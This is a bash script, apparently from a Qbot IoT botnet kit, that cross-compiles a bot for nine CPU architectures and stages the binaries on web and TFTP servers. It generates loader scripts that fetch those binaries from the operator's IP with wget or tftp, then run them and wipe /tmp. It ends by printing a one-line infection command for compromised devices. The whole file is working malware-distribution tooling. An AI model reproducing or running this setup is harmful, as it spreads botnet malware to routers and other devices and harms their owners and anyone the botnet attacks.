#!/bin/bash
#########################################
###############Made date/ etc############
#########################################

wgetsh="bin.sh"
tftp1="bin2.sh"
tftp2="bin3.sh"
Aarm7="fuckqbotarm"
Amipsel="fuckqbotmipsel"
Amips="fuckqbotmips"
Amips64="fuckqbotmips64"
Ai686="fuckqboti686"
Asparc="fuckqbotsparc"
Ash4="fuckqbotsh4"
Ax64="fuckqbotx64"
Appc="fuckqbotppc"

if [ $# == 0 ]; then
echo "Usage: bash $0 [BOT] [Server IP]"
exit 0
fi

function whatthefuckiswrongwithyou1() {
echo "Usage: bash $0 [BOT] [Server IP]"
echo "what the fuck are you doing?"
}

function whatthefuckiswrongwithyou2() {
echo "Usage bash $0 [BOT] [Server IP]"
echo "what the fuck are you doing?"
}

if [ "$1" ==  "$NULL" ];  then
    whatthefuckiswrongwithyou1
    exit
fi

if [ "$2" == "$NULL" ]; then
    whatthefuckiswrongwithyou2
    exit
fi

clear; read -p "Made by XORA, Jabber; XORA@riseup.net [Press enter to continue]"

if [ -f /usr/bin/yum ]; then
echo "Installing Packages..."
echo "ulimit -n 99999; ulimit -u 99999; ulimit -s 99999" >> ~/.bashrc
ulimit -n 99999
ulimit -u 99999
ulimit -s 99999
source ~/.bashrc
yum update -y && yum upgrade -y --skip-broken
yum groupinstall "Development Tools" -y --skip-broken
yum install gcc -y --skip-broken
yum install tftp -y --skip-broken
yum install tftp-server -y --skip-broken
yum install xinetd -y --skip-broken
yum install httpd -y --skip-broken
service httpd restart
service xinetd restart
chkconfig xinetd on
elif [ -f /usr/bin/apt-get ]; then
echo "Installing Packages..."
echo "ulimit -n 99999; ulimit -u 99999; ulimit -s 99999" >> ~/.bashrc
ulimit -n 99999
ulimit -u 99999
ulimit -s 99999
source ~/.bashrc
apt-get update -y && apt-get upgrade -y
apt-get install build-essential -y
apt-get install gcc -y
apt-get install nginx -y
apt-get install tftp -y
apt-get install tftpd -y
apt-get install tftpd-hpa -y
apt-get install xinetd -y
service nginx start
service xinetd start
service tftpd-hpa start
apt-get install bzip2 -y
fi

if [ -d cross-compiler-armv7l ]; then
echo -e "cross-compiler-armv7l is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
tar -xvjf cross-compiler-armv7l.tar.bz2
fi

if [ -d cross-compiler-mipsel ]; then
echo -e "cross-compiler-mipsel is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mipsel.tar.bz2
tar -xvjf cross-compiler-mipsel.tar.bz2
fi

if [ -d cross-compiler-mips ]; then
echo -e "cross-compiler-mips is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips.tar.bz2
tar -xvjf cross-compiler-mips.tar.bz2
fi

if [ -d cross-compiler-mips64 ]; then
echo -e "cross-compiler-mips64 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips64.tar.bz2
tar -xvjf cross-compiler-mips64.tar.bz2
fi

if [ -d cross-compiler-i686 ]; then
echo -e "cross-compiler-i686 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-i686.tar.bz2
tar -xvjf cross-compiler-i686.tar.bz2
fi

if [ -d cross-compiler-sparc ]; then
echo -e "cross-compiler-sparc is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sparc.tar.bz2
tar -xvjf cross-compiler-sparc.tar.bz2
fi

if [ -d cross-compiler-sh4 ]; then
echo -e "cross-compiler-sh4 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sh4.tar.bz2
tar -xvjf cross-compiler-sh4.tar.bz2
fi

if [ -d cross-compiler-x86_64 ]; then
echo -e "cross-compiler-x86_64 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-x86_64.tar.bz2
tar -xvjf cross-compiler-x86_64.tar.bz2
fi

if [ -d cross-compiler-powerpc ]; then
echo -e "cross-compiler-powerpc is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-powerpc.tar.bz2
tar -xvjf cross-compiler-powerpc.tar.bz2
fi

if [ -d *.tar.bz2 ]; then
echo -e "Removing All .tar.bz2 files"
else
rm -rf *.tar.bz2
fi

echo -en "\n"
echo "Cross Compiling... please wait."

if [ -f $Aarm7 ]; then
echo -en "arm7 is present // Binary Name: $Aarm7\n"
else
./cross-compiler-armv7l/bin/armv7l-gcc -static -lpthread -pthread -Darm7 -o $Aarm7 $1 > /dev/null 2>&1
fi

if [ -f $Amipsel ]; then
echo -en "mipsel is present // Binary Name: $Amipsel\n"
else
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -Dmipsel -o $Amipsel $1 > /dev/null 2>&1
fi

if [ -f $Amips ]; then
echo -en "mips is present // Binary Name: $Amips\n"
else
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $Amips $1 > /dev/null 2>&1
fi

if [ -f $Amips64 ]; then
echo -en "mips64 is present // Binary Name: $Amips64\n"
else
./cross-compiler-mips64/bin/mips64-gcc -static -lpthread -pthread -Dmips64 -o $Amips64 $1 > /dev/null 2>&1
fi

if [ -f $Ai686 ]; then
echo -en "i686 is present // Binary Name: $Ai686\n"
else
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $Ai686 $1 > /dev/null 2>&1
fi

if [ -f $Asparc ]; then
echo -en "sparc is present // Binary Name: $Asparc\n"
else
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $Asparc $1 > /dev/null 2>&1
fi

if [ -f $Ash4 ]; then
echo -en "sh4 is present // Binary Name: $Ash4\n"
else
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $Ash4 $1 > /dev/null 2>&1
fi

if [ -f $Ax64 ]; then
echo -en "x86_64 is present // Binary Name: $Ax64\n"
else
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx64 -o $Ax64 $1 > /dev/null 2>&1
fi

if [ -f $Appc ]; then
echo -en "ppc is present // Binary Name: $Appc\n"
else
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dppc -o $Appc $1 > /dev/null 2>&1
fi

if [ -f /usr/bin/yum ]; then
chmod 777 /var/lib/tftpboot
chmod 777 /var/www/html
cp $Aarm7 $Amipsel $Amips $Amips64 $Ai686 $Asparc $Ash4 $Ax64 $Appc /var/lib/tftpboot
cp $Aarm7 $Amipsel $Amips $Amips64 $Ai686 $Asparc $Ash4 $Ax64 $Appc /var/www/html
touch /var/www/html/$wgetsh; chmod 777 /var/www/html/$wgetsh
touch /var/lib/tftpboot/$tftp1; chmod 777 /var/lib/tftpboot/$tftp1
touch /var/lib/tftpboot/$tftp2; chmod 777 /var/lib/tftpboot/$tftp2
elif [ -f /usr/bin/apt-get ]; then
chmod 777 /srv/tftp
chmod 777 /usr/share/nginx/www
chmod 777 /usr/share/nginx/html
cp $Aarm7 $Amipsel $Amips $Amips64 $Ai686 $Asparc $Ash4 $Ax64 $Appc /srv/tftp
cp $Aarm7 $Amipsel $Amips $Amips64 $Ai686 $Asparc $Ash4 $Ax64 $Appc /usr/share/nginx/www
cp $Aarm7 $Amipsel $Amips $Amips64 $Ai686 $Asparc $Ash4 $Ax64 $Appc /usr/share/nginx/html
touch /usr/share/nginx/www/$wgetsh; chmod 777 /usr/share/nginx/www/$wgetsh
touch /usr/share/nginx/html/$wgetsh; chmod 777 /usr/share/nginx/html/$wgetsh
touch /srv/tftp/$tftp1; chmod 777 /srv/tftp/$tftp1
touch /srv/tftp/$tftp2; chmod 777 /srv/tftp/$tftp2
fi

if [ -d /usr/share/nginx/html ]; then
echo "ulimit -n 712" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Aarm7; chmod 777 $Aarm7; ./$Aarm7" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amipsel; chmod 777 $Amipsel; ./$Amipsel" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips; chmod 777 $Amips; ./$Amips" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips64; chmod 777 $Amips64; ./$Amips64" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ai686; chmod 777 $Ai686; ./$Ai686" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Asparc; chmod 777 $Asparc; ./$Asparc" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ash4; chmod 777 $Ash4; ./$Ash4" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ax64; chmod 777 $Ax64; ./$Ax64" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Appc; chmod 777 $Appc; ./$Appc" >>/usr/share/nginx/html/$wgetsh
echo "rm -rf /tmp/*" >>/usr/share/nginx/html/$wgetsh
elif [ -d /usr/share/nginx/www ]; then
echo "ulimit -n 712" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Aarm7; chmod 777 $Aarm7; ./$Aarm7" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amipsel; chmod 777 $Amipsel; ./$Amipsel" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips; chmod 777 $Amips; ./$Amips" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips64; chmod 777 $Amips64; ./$Amips64" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ai686; chmod 777 $Ai686; ./$Ai686" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Asparc; chmod 777 $Asparc; ./$Asparc" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ash4; chmod 777 $Ash4; ./$Ash4" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ax64; chmod 777 $Ax64; ./$Ax64" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Appc; chmod 777 $Appc; ./$Appc" >>/usr/share/nginx/www/$wgetsh
echo "rm -rf /tmp/*" >>/usr/share/nginx/www/$wgetsh
fi

if [ -d /var/www/html ]; then
echo "ulimit -n 712" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Aarm7; chmod 777 $Aarm7; ./$Aarm7" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amipsel; chmod 777 $Amipsel; ./$Amipsel" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips; chmod 777 $Amips; ./$Amips" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Amips64; chmod 777 $Amips64; ./$Amips64" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ai686; chmod 777 $Ai686; ./$Ai686" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Asparc; chmod 777 $Asparc; ./$Asparc" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ash4; chmod 777 $Ash4; ./$Ash4" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Ax64; chmod 777 $Ax64; ./$Ax64" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Appc; chmod 777 $Appc; ./$Appc" >>/var/www/html/$wgetsh
echo "rm -rf /tmp/*" >>/var/www/html/$wgetsh
else
echo "Oops.. WE FUCKED UP"
fi

if [ -d /srv/tftp ]; then
echo "ulimit -n 712" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Aarm7 -g $2; chmod +x $Aarm7; ./$Aarm7; rm -rf $Aarm7*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amipsel -g $2; chmod +x $Amipsel; ./$Amipsel; rm -rf $Amipsel*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amips -g $2; chmod +x $Amips; ./$Amips; rm -rf $Amips*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amips64 -g $2; chmod +x $Amips64; ./$Amips64; rm -rf $Amips64*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ai686 -g $2; chmod +x $Ai686; ./$Ai686; rm -rf $Ai686*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Asparc -g $2; chmod +x $Asparc; ./$Asparc; rm -rf $Asparc*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ash4 -g $2; chmod +x $Ash4; ./$Ash4; rm -rf $Ash4*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ax64 -g $2; chmod +x $Ax64; ./$Ax64; rm -rf $Ax64*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Appc -g $2; chmod +x $Appc; ./$Appc; rm -rf $Appc*" >>/srv/tftp/$tftp1
echo "rm -rf /tmp/*" >>/srv/tftp/$tftp1
echo "ulimit -n 712" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Aarm7; chmod +x $Aarm7; ./$Aarm7; rm -rf $Aarm7*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amipsel; chmod +x $Amipsel; ./$Amipsel; rm -rf $Amipsel*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amips; chmod +x $Amips; ./$Amips; rm -rf $Amips*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amips64; chmod +x $Amips64; ./$Amips64; rm -rf $Amips64*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ai686; chmod +x $Ai686; ./$Ai686; rm -rf $Ai686*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Asparc; chmod +x $Asparc; ./$Asparc; rm -rf $Asparc*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ash4; chmod +x $Ash4; ./$Ash4; rm -rf $Ash4*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ax64; chmod +x $Ax64; ./$Ax64; rm -rf $Ax64*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Appc; chmod +x $Appc; ./$Appc; rm -rf $Appc*" >>/srv/tftp/$tftp2
echo "rm -rf /tmp/*" >>/srv/tftp/$tftp2
elif [ -d /var/lib/tftpboot ]; then
echo "ulimit -n 712" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Aarm7 -g $2; chmod +x $Aarm7; ./$Aarm7; rm -rf $Aarm7*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amipsel -g $2; chmod +x $Amipsel; ./$Amipsel; rm -rf $Amipsel*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amips -g $2; chmod +x $Amips; ./$Amips; rm -rf $Amips*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Amips64 -g $2; chmod +x $Amips64; ./$Amips64; rm -rf $Amips64*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ai686 -g $2; chmod +x $Ai686; ./$Ai686; rm -rf $Ai686*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Asparc -g $2; chmod +x $Asparc; ./$Asparc; rm -rf $Asparc*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ash4 -g $2; chmod +x $Ash4; ./$Ash4; rm -rf $Ash4*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Ax64 -g $2; chmod +x $Ax64; ./$Ax64; rm -rf $Ax64*" >>/var/lib/tftpboot/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Appc -g $2; chmod +x $Appc; ./$Appc; rm -rf $Appc*" >>/var/lib/tftpboot/$tftp1
echo "rm -rf /tmp/*" >>/var/lib/tftpboot/$tftp1
echo "ulimit -n 712" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Aarm7; chmod +x $Aarm7; ./$Aarm7; rm -rf $Aarm7*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amipsel; chmod +x $Amipsel; ./$Amipsel; rm -rf $Amipsel*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amips; chmod +x $Amips; ./$Amips; rm -rf $Amips*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Amips64; chmod +x $Amips64; ./$Amips64; rm -rf $Amips64*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ai686; chmod +x $Ai686; ./$Ai686; rm -rf $Ai686*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Asparc; chmod +x $Asparc; ./$Asparc; rm -rf $Asparc*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ash4; chmod +x $Ash4; ./$Ash4; rm -rf $Ash4*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Ax64; chmod +x $Ax64; ./$Ax64; rm -rf $Ax64*" >>/var/lib/tftpboot/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Appc; chmod +x $Appc; ./$Appc; rm -rf $Appc*" >>/var/lib/tftpboot/$tftp2
echo "rm -rf /tmp/*" >>/var/lib/tftpboot/$tftp2
fi
clear
echo -en "\n"
echo -e "cd /tmp || cd /var/run;wget http://$2/$wgetsh;sh $wgetsh;rm -rf $wgetsh;tftp -r $tftp1 -g $2;sh $tftp1; tftp $2 -c get $tftp2; sh $tftp2; rm -rf $tftp1 $tftp2 $wgetsh"
